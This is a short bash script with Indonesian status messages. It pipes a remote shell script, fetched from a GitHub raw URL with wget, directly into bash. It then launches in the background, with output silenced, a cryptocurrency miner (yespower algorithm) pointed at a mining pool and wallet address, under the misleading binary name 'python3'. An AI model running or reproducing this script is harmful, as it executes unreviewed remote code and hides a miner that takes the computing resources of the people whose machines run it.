#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"

sleep 5

clear

echo "sedang menjalankan..."

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &

sleep 5

echo "sukses berjalan cok..."
